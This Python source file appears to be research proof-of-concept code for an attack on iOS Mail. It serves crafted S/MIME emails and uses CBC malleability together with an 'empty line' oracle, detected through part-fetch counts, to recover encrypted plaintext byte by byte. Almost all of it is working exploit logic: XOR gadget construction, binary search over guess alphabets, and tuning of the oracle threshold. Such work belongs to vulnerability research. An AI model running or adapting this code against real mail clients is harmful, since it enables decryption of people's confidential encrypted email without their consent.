"""
Oracle present in iOS Mail, expecting an empty line in the email.
"""
# pylint: disable=fixme
import itertools
import sys
import time
from base64 import encodebytes
from binascii import hexlify
from collections import defaultdict
import sched
import threading
import traceback
from functools import cache
import logging

# pylint: disable=import-error
from asn1crypto import cms
from Crypto.Cipher import AES
from cryptography.utils import int_to_bytes
#from pkcs1.eme_pkcs1_v15 import decode as pkcs1_decode

from bb import Mail
from mail_generator import BlockDecryptedException, MailGenerator

ASCII_SYMBOLS = b"".join([bytes([i]) for i in range(128)])
HEX_SYMBOLS = b"0123456789abcdef"
SYMBOLS = ASCII_SYMBOLS

LOGGER = logging.getLogger("EmptyLineOracle")
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')
LOGGER.info("Starting IMAP server!")
if SYMBOLS == HEX_SYMBOLS:
    LOGGER.info("Guessing 1 Block with only hex characters.")
elif SYMBOLS == ASCII_SYMBOLS:
    LOGGER.info("Guessing 1 Block with ASCII characters.")

BOUNDARY = "mixed"
CONTENT_TYPE = "multipart/mixed"

HEADERS = """To: oracle@example.org
From: oracle@example.org
Subject: {subject}
{extra_headers}

""".replace("\n", "\r\n")

MULTIPART_CONTENT_TYPE = f"Content-Type: {CONTENT_TYPE}; boundary=\"{BOUNDARY}\""
SMIME_CONTENT_TYPE = """Content-Type: application/pkcs7-mime;
	name=smime.p7m;
	smime-type=enveloped-data"""

PART_HEADERS = """--mixed
Content-Type: application/pkcs7-mime;
	name=smime.p7m;
	smime-type=enveloped-data
Content-Transfer-Encoding: base64
Mime-Version: 1.0
Content-Disposition: attachment;
	filename=smime.p7m\r\n"""


FOOTER = """--mixed--"""

SMIME_HEADERS = f"""{SMIME_CONTENT_TYPE}
Content-Transfer-Encoding: base64
Mime-Version: 1.0
Content-Disposition: attachment;
	filename=smime.p7m
""".replace("\n", "\r\n")

TEMPLATE_CONTENT = PART_HEADERS + """\r\n{content}"""
SINGLE_PART_TEMPLATE = SMIME_HEADERS + """\r\n{content}"""

#template_content = "{content}"

BODYSTRUCTURE = """({content} "mixed" ("boundary" "mixed") NIL NIL NIL)"""

STRUCTURE_PART = '("application" "pkcs7-mime" ("name" "smime.p7m" "smime-type" "enveloped-data") \
NIL "S/MIME Encrypted Message" "base64" {message_length} NIL ("attachment" ("filename" "smime.p7m")) NIL NIL)'


def eprint(*args, **kwargs):
    """
    Prints to stderr.
    """
    print(*args, file=sys.stderr, **kwargs)


def chunks(lst, chunk_size):
    """
    Yield successive n-sized chunks from lst.
    https://stackoverflow.com/questions/312443/how-do-you-split-a-list-into-evenly-sized-chunks
    """
    for i in range(0, len(lst), chunk_size):
        yield lst[i:i + chunk_size]


def split_list(lst, list_count):
    """Yield n sequential chunks from l."""
    result, remainder = divmod(len(lst), list_count)
    for i in range(list_count):
        step_index = (result+1)*(i if i < remainder else remainder) + \
            result*(0 if i < remainder else i - remainder)
        yield lst[step_index:step_index+(result+1 if i < remainder else result)]


def scheduler_worker(scheduler):
    """
    Scheduler thread starter.
    """
    scheduler.run()


# pylint: disable=too-many-instance-attributes
class EmptyLineBinarySearchGenerator(MailGenerator):
    """
    MailGenerator for the empty line oracle as present in iOS Mail.
    """
    # pylint: disable=too-many-arguments
    def __init__(self, org, key_file, repeat=15, threshold=15, alphabet_split=16,
                switch_to=16, sequential=False):
        """
        Org: Original CMS
        key_file: Key file to decrypt the CMS (for debugging only)
        repeat: How many parts per mail?
        threshold: After how many part requests should we assume that the query is "correct"?
        alphabet_split: Into how many queries should we split the alphabet in each round?
            2 means binary search
            None mean sequential search
        switch_to: Switch to this split after the first two bytes are found
            (since the alphabets are way smaller)
        sequential: Add messages to a queue and only send them to client once finished
            with the last query, simulating an attacker that cannot differentiate between mails
            (e.g., passive MitM on TLS)
        """
        super().__init__(org, key_file)
        # Symbols that possibly are in the mail
        #self.possible_symbols = b"0123456789abcdef"
        self.possible_symbols = SYMBOLS
        # How long to wait between fetches until we assume that fetching is done
        # for current guesses
        self.check_timer = 0.25

        # Mail headers
        self.headers = HEADERS.format(
            subject="Empty Line Binary Guess", extra_headers=MULTIPART_CONTENT_TYPE)
        # UID: number of queries
        self.query_counts = defaultdict(int)
        # UID: mail
        self.mails = {}
        # Next mail to create
        self.next = 1
        # Mails with correct guess verified by oracle
        self.correct_guesses = set()
        # Time taken for the whole attack
        self.finished_time = None
        # Create but (As of yet) unrequested Mails
        self.unrequested = set()
        # How many guessses have we created in total?
        self.guess_count = 0
        # Highest created UID
        self.highest_num = -1
        # UID: actual guessed bytes
        self.guess_bytes = {}
        # Time after which the attack finished
        self.all_done = None
        # Current alphabet of guesses (possible symbols ** possible symbols)
        self.current_alphabets = [list(itertools.product(
            self.possible_symbols, self.possible_symbols))]
        # For testing rounds >= 2
        #self.current_alphabets = [[b"12"],[b"23"]]
        # Current round
        self.round = 0
        # Are we currently in the process of creating mails?
        self.creating_mails = True
        # How many times should the guess be repeated in a mail?
        self.repeat = repeat
        # After how many part requests should be we assume that the mail is valid?
        self.threshold = threshold
        self.org_cms = None
        self.org_key = None
        self.new_cms = None
        self.last_request = None
        # Mails for the current round
        self.current_mails = set()
        self.scheduler = sched.scheduler(time.time, time.sleep)
        self.scheduler.enter(self.check_timer/2, 1, self.check_status)
        scheduler_thread = threading.Thread(target=scheduler_worker, args=[
                                            self.scheduler], daemon=True)
        scheduler_thread.start()
        if alphabet_split is None:
            self.alphabet_split = len(
                self.possible_symbols) * len(self.possible_symbols)
        else:
            self.alphabet_split = alphabet_split
        self.switch_to = switch_to
        self.finished = False
        self.queue = set()
        self.sequential = sequential
        self.guess_counter = 0
        self.logger = LOGGER
        # Guess number with which this round started
        self.current_start = None
        # Time at which the current round started
        self.round_start = None
        # Number of queries in the current round
        self.round_queries = 0

    def dump_queue(self):
        """
        Convenience function that dumps the whole queue in to the current mails list.
        """
        self.logger.debug("Dumping %d mails from the queue.", len(self.queue))
        while self.queue:
            uid = self.queue.pop()
            self.logger.debug("UID: %d", uid)
            self.current_mails.add(uid)

    def check_status(self):
        """
        Periodically executed function that checks if network idle was long enough
        to add new guesses.
        """
        # pylint: disable=bare-except
        try:
            if self.last_request is None:
                self.scheduler.enter(self.check_timer, 1, self.check_status)
                return
            since_last_request = time.time()-self.last_request
            unrequested = self.current_mails.intersection(self.unrequested)
            if since_last_request > self.check_timer:
                self.logger.debug("Time since last request: %d unrequested mails:"
                                  "%d, correct guesses: %d",
                                  since_last_request, len(unrequested), len(self.correct_guesses))
                self.logger.debug("Still in queue: %d", len(self.queue))
                self.logger.debug("Still unrequested: %d", len(unrequested))
                if len(unrequested) == 0 and len(self.queue) > 0:
                    if self.sequential:
                        self.logger.debug("Adding new mail from queue!")
                        self.current_mails.add(self.queue.pop())
                    else:
                        self.dump_queue()
                elif len(unrequested) == 0 and len(self.correct_guesses) > 0:
                    self.create_next_guesses()
                else:
                    self.logger.debug("Not yet ready to create new mails...")
            self.scheduler.enter(self.check_timer, 1, self.check_status)
        except BlockDecryptedException as block_decrypted:
            self.finished = block_decrypted.args[0]
        except:
            traceback.print_exc()
            self.scheduler.enter(self.check_timer, 1, self.check_status)

    def setup(self, _ciphertext_multiplier=1):
        """
        Setup function called by the server. Loads the CMS.
        """
        self.org_cms = cms.ContentInfo.load(self.org)
        self.org_key = int.from_bytes(
            bytes(self.org_cms["content"]["recipient_infos"][0].chosen["encrypted_key"]), 'big')

        iv_new, cipher_new = self.create_xor_guess()
        self.new_cms = self.org_cms.copy()
        encrypted_content_info = self.new_cms["content"]["encrypted_content_info"]
        encrypted_content_info["encrypted_content"] = cipher_new
        encrypted_content_info["content_encryption_algorithm"]["parameters"] = iv_new

    def get_part_size(self):
        """
        Get the size of a part in bytes.
        """
        # TODO: Fix for binary search
        return len((encodebytes(self.new_cms.dump())).strip())

    def get_footer(self):
        """
        Get the mail footer.
        """
        return FOOTER

    def get_part_headers(self, _num, _part):
        """
        Get the headers for a part.
        """
        return PART_HEADERS

    def create_xor_guess(self, block_index=0, xor=b"\x00"*16):
        """
        Gets the block at block_index from the original ciphertext and
        performs a CBC-style xor by xoring the previous block.
        Return the previous (now xor-ed) block and the block at block_index.
        For block_index==0: previous block is the IV.

        Return: bytes
        """
        cipher_text = bytes(
            self.org_cms["content"]["encrypted_content_info"]["encrypted_content"])
        initv = bytes(self.org_cms["content"]["encrypted_content_info"]
                      ["content_encryption_algorithm"]["parameters"])
        # The IV is essentially the first ciphertext block (block_index=-1)
        cipher_text = initv + cipher_text
        blocks = list(chunks(cipher_text, 16))
        # IV of the XOR gadget (now at block_index since the original IV
        # was prepended to the ciphertext)
        initv = bytearray(blocks[block_index])
        for i, byte in enumerate(xor):
            initv[i] = initv[i] ^ byte
        block = blocks[block_index+1]
        return bytes(initv), block

    def decrypt(self, cms_object, output=True):
        """
        Utility function to test-decrypt a CMS.
        """
        initv = bytes(cms_object["content"]["encrypted_content_info"]
                      ["content_encryption_algorithm"]["parameters"])
        cipher_text = bytes(
            cms_object["content"]["encrypted_content_info"]["encrypted_content"])
        enc_key = int.from_bytes(bytes(
            cms_object["content"]["recipient_infos"][0].chosen["encrypted_key"]), 'big')
        dec_key = int_to_bytes(pow(enc_key, self.dec, self.n))
        # try:
        # if output:
        #eprint(f"PKCS1v1.5: {hexlify(dec_key).decode()}")
        # eprint("AES Key (PKCS1): "\
        # + f"{hexlify(pkcs1_decode(bytes(bytearray(bytes([0x00])+dec_key)))).decode()}")
        # pylint: disable=bare-except
        # except:
        # pass
        key_found = False
        for i, byte in enumerate(dec_key):
            if byte == 0:
                key_found = True
                dec_key = dec_key[i+1:]
                break
        if not key_found:
            dec_key = dec_key[-32:]
        # if output:
            #eprint(f"len(AES Key): {len(dec_key)}")
            #eprint(f"AES Key: {hexlify(dec_key).decode()}")
        try:
            aes = AES.new(dec_key, AES.MODE_CBC, initv)
            plain_text = aes.decrypt(cipher_text)
            if output:
                eprint(f"Plain text: {hexlify(plain_text[:32]).decode()}")
                eprint("0x0a 0x0a in Plain text: " +
                       str(b'\n\n' in plain_text))
            return plain_text
        # pylint: disable=bare-except
        except:
            if output:
                eprint("AES key wrong length")
        return None

    def create_mail(self, uid):
        """
        Creates a new mail with the given UID.
        """
        # No need to recreate an existing mail
        if uid in self.unrequested:
            return self
        self.logger.debug("Creating UID %d", uid)
        self.unrequested.add(uid)
        if uid > self.highest_num:
            self.highest_num = uid
        if not self.creating_mails:
            # Return a dummy
            self.logger.debug("%d is a dummy.", uid)
            self.mails[uid] = Mail(self.new_cms, self.headers, num_parts=1)
            return self
        guess = self.create_guess_batch(uid, self.guess_count)
        self.guess_count += 1
        if guess is not None:
            self.guess_counter += 1
            self.round_queries += 1
            self.queue.add(uid)
        return self

    def create_first_batch(self, start_uid):
        """
        Create the first batch of messages starting at start_uid.
        Just calls create_mail alphabet_split times.
        """
        mails = []
        self.current_start = self.guess_count
        for i in range(len(self.current_alphabets)*self.alphabet_split):
            mails.append(self.create_mail(start_uid+i))
        self.creating_mails = False
        if not self.sequential:
            self.dump_queue()
        else:
            self.current_mails.add(self.queue.pop())
        return mails

    def get_guess_alphabet(self, guess_number):
        """
        Returns the alphabet too use for the guess_number.
        """
        self.logger.debug("current_start %d guess_number %d", self.current_start, guess_number)
        guess_counter = guess_number - self.current_start
        alphabet_count = len(self.current_alphabets)
        self.logger.debug("Remaining Alphabets: %d", alphabet_count)
        # We cannot generate more guesses than the current alphabet count
        # * the guesses per alphabet
        if guess_counter > alphabet_count * self.alphabet_split:
            self.logger.error("Too many guesses: %d > %d",
                              guess_counter, alphabet_count*self.alphabet_split)
            return None

        # We assume that we will be called enough times to get through
        # all remaining alphabets
        alphabet_index = guess_counter // self.alphabet_split
        self.logger.debug("guess_counter %d alphabet index %d", guess_counter, alphabet_index)
        if alphabet_index > alphabet_count-1:
            self.logger.warning("Got alphabet index (%d) > alphabet count (%d)", alphabet_index, alphabet_count)
            # Should not happen, but just to be sure ...
            return None
        alphabet = self.current_alphabets[alphabet_index]
        alphabet_chunks = list(split_list(alphabet, self.alphabet_split))
        split = guess_counter - (self.alphabet_split*alphabet_index)
        return alphabet_chunks[split]

    def create_guess_batch(self, uid, guess_number, empty_xor=b"\x00"):
        """
        Create mails for binary search of the first two bytes.
        """
        self.logger.debug("Batch create %d: UID %d!", guess_number, uid)
        chunk = self.get_guess_alphabet(guess_number)
        if chunk is None or len(chunk) == 0:
            self.logger.debug("UID %d got no alphabet", uid)
            return None
        self.logger.info("UID %d Using Alphabet %s..%s", uid, bytes(chunk[0]), bytes(chunk[-1]))
        self.guess_bytes[uid] = chunk
        cipher_new = b""
        initv = None
        self.logger.debug("%d Alphabet len %d", uid,
                          len(self.guess_bytes[uid]))
        self.logger.debug("%d: %s..%s", uid, bytes(chunk[0]), bytes(chunk[-1]))
        for byte_guess in self.guess_bytes[uid]:
            if self.round == 0:
                # Round zero means we are guessing the first two bytes at once
                i = byte_guess[0]
                j = byte_guess[1]
                # XOR bytes with 0xa to get b"\n\n" in case we are correct
                xor = bytes([i ^ 0xa, j ^ 0xa])
                # And fill it up until we reach 16 bytes
                xor += empty_xor*14
            else:
                # We are guessing on of the bytes after the first two
                # That means we already know all bytes up until self.round
                # and can fill up until self.round-1 to get a zero byte
                # prefix
                xor = bytes(byte_guess[:self.round-1])
                # Next we want the known byte xor 0xa to get one newline
                xor += bytes([byte_guess[self.round-1] ^ 0xa])
                # Next comes our actual guess byte
                xor += bytes([byte_guess[self.round] ^ 0xa])
                # Fill it up to 16 bytes
                xor += empty_xor * (15-self.round)
            assert len(xor) == 16
            cipher_0, cipher_1 = self.create_xor_guess(xor=xor)
            if initv is None:
                initv, cipher = cipher_0, cipher_1
            else:
                cipher = cipher_0 + cipher_1
            cipher_new += cipher
        if self.round == 15:
            # For the last round, we have to add an additional ciphertext block
            # in case that the last guess is the correct one. Otherwise, the mail
            # will end with an empty line, which Mail doesn't accept as valid.
            cipher_new += empty_xor*16

        self.new_cms = self.org_cms.copy()
        encrypted_content_info = self.new_cms["content"]["encrypted_content_info"]
        encrypted_content_info["encrypted_content"] = cipher_new
        encrypted_content_info["content_encryption_algorithm"]["parameters"] = initv
        self.mails[uid] = Mail(self.new_cms, self.headers, self.repeat)
        self.mails[uid].alphabet = chunk
        self.next += 1
        return self

    @cache
    def generate_bodystructure(self, num):
        """
        Generate the bodystructure of a mail and return it.
        """
        return self.mails[num].generate_bodystructure()

    def generate_next_guesses(self):
        """
        Generate mails for the next guesses.
        """
        start = self.highest_num + 1
        self.creating_mails = True
        self.current_start = self.guess_count
        for i in range(len(self.current_alphabets)*self.alphabet_split):
            self.logger.debug("start %d, current_start %d i %d", start, self.current_start, i)
            self.create_mail(start+i)
        self.creating_mails = False
        self.correct_guesses = set()
        if not self.sequential:
            self.dump_queue()

    @cache
    def get_part(self, uid, part):
        """
        Get a message part. The actual oracle test is implemented here.
        Upon receiving a specifig number of part request for a message
        (i.e., self.threshold), we assume that it is valid according to the oracle.
        """
        if self.last_request is None:
            self.round_start = time.time()
        self.last_request = time.time()
        self.query_counts[uid] += 1
        self.unrequested.discard(uid)
        if self.query_counts[uid] in [1, self.threshold] or self.query_counts[uid] % 10 == 0:
            self.logger.debug("%d requested %d times",
                              uid, self.query_counts[uid])
        if self.query_counts[uid] == self.threshold and uid in self.current_mails:
            self.correct_guesses.add(uid)
            if isinstance(self.guess_bytes[uid][0], (tuple, list)):
                self.logger.info("O(%s..%s) == 1",
                                 bytes(list(self.guess_bytes[uid][0])),
                                 bytes(list(self.guess_bytes[uid][-1])))
            else:
                self.logger.info("Guessed bytes %s", self.guess_bytes[uid])
            # part_content = b64decode(self.mails[uid].get_part(part))
            # correct_cms = cms.ContentInfo.load(part_content)
            # self.decrypt(correct_cms)
        return self.mails[uid].get_part(part)

    def create_next_guesses(self):
        """
        Add the next guesses to the queue by iterating over the previously correct guesses
        """
        requested = len(self.query_counts.keys())
        self.logger.info("Creating next guess mails ...")
        if requested > 0 and len(self.unrequested.intersection(self.current_mails)) == 0 \
            and len(self.correct_guesses) > 0:
            # pylint: disable=no-else-raise
            if len(self.correct_guesses) == 0:
                # TODO: Backtracking until we find a candidate we missed before?
                raise Exception("No valid candidates found!")
            elif len(self.correct_guesses) > 1:
                # TODO: What happens if all remaining candidate alphabets only contain
                # a single guess? The we would have to change the xor.
                self.logger.info("Found %d possible candidates, continuing with all of them ...", len(
                    self.correct_guesses))
                if len(self.guess_bytes[list(self.correct_guesses)[0]]) < 10:
                    self.repeat = 30
                    self.threshold = 30
                self.unrequested = set()
                self.current_alphabets = []
                #self.current_mails = set()
                for uid in self.correct_guesses:
                    alphabet = self.guess_bytes[uid]
                    self.current_alphabets.append(alphabet)
                    #self.logger.info("%s..%s", bytes(
                        #alphabet[0]), bytes(alphabet[-1]))
                self.correct_guesses = set()
                self.generate_next_guesses()
                return
            correct_uid = self.correct_guesses.pop()
            self.correct_guesses.add(correct_uid)
            guess_alphabet = self.guess_bytes[correct_uid]
            if len(guess_alphabet) < 10:
                self.repeat = 30
                self.threshold = 30
            self.current_alphabets = [guess_alphabet]
            #self.current_mails = set()
            if len(guess_alphabet) > 1:
                # The alphabet still contains more than one possibility
                self.generate_next_guesses()
            else:
                self.logger.info("="*60)
                # We found the correct tuple!
                self.logger.info("Finished round %d in %d seconds and %d queries",
                                 self.round, int(time.time()-self.round_start), self.round_queries)
                self.logger.info(f"Currently known bytes: {' '.join(chr(b) for b in list(guess_alphabet[0]))}")
                self.logger.info("="*60)
                self.round_queries = 0
                if self.round == 15:
                    self.all_done = time.time()
                    raise BlockDecryptedException(guess_alphabet[0])
                if self.round == 0:
                    # Round 0 actually guesses byte 0 and 1
                    self.round += 2

                    logging.basicConfig(
                        level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
                    self.alphabet_split = self.switch_to
                    # Mails with too few parts break the oracle (too many false positivies)
                    # after the first two rounds ...
                    # Probably because the mails get too short
                    self.repeat = 30
                    self.threshold = 30
                else:
                    self.round += 1
                self.round_start = time.time()
                self.logger.info("Starting round %d", self.round)
                known_bytes = list(guess_alphabet[0])
                self.current_alphabets = []
                alphabet = []
                for symbol in self.possible_symbols:
                    tmp = known_bytes.copy()
                    tmp.append(symbol)
                    alphabet.append(tmp)
                self.current_alphabets.append(alphabet)
                self.generate_next_guesses()

    def get_size(self, num):
        """
        Get message size.
        """
        return self.mails[num].get_size()

    def get_body(self, num):
        """
        Get the whole body of a message.
        """
        return self.mails[num].get_body()

    @cache
    def get_headers(self, num=1):
        """
        Get the headers of a message.
        """
        return self.mails[num].headers

    def get_next_unseen(self):
        """
        Return the number of the next unseen message.
        """
        return self.next
